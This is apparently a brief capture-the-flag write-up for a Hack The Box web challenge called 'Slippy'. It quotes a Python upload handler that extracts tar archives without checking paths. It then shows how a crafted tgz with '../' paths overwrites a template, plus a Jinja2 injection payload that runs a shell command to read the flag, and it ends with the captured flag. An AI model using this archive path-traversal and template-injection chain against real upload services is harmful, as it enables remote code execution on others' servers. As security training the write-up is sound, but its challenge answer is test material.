@@ -1,0 +1,58 @@
+take attention this code:
+def extract_from_archive(file):
+    tmp  = tempfile.gettempdir()
+    path = os.path.join(tmp, file.filename)
+    file.save(path)
+
+    if tarfile.is_tarfile(path):
+        tar = tarfile.open(path, 'r:gz')
+        tar.extractall(tmp)
+
+        extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
+        os.makedirs(extractdir, exist_ok=True)
+
+        extracted_filenames = []
+
+        for tarinfo in tar:
+            name = tarinfo.name
+            if tarinfo.isreg():
+                filename = f'{extractdir}/{name}'
+                os.rename(os.path.join(tmp, name), filename)
+                extracted_filenames.append(filename)
+                continue
+            
+            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
+
+        tar.close()
+        return extracted_filenames
+
+    return False
+
+seems dono sanitizing path location file.
+
+create file tree like this:
+└─$ tree                                             
+.
+├── index.html
+├── templates
+│   └── index.html
+└── test
+    └── test
+        ├── index.html
+        └── test
+            └── index.tgz
+
+create tgz:
+command: tar cPzvf index.tgz ../../../templates/index.html
+
+index.html code:
+{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('cat /app/flag',shell=1) }}
+
+upload tgz 
+access: http://144.126.206.249:31674/
+result:
+b'HTB{i_slipped_my_way_to_rce}\n'
+
+resource:
+https://notateamserver.xyz/uni-ctf-slippy/
+https://github.com/h4sh5/htb-uni-ctf-quals-2021/blob/master/web/1_slippy.md
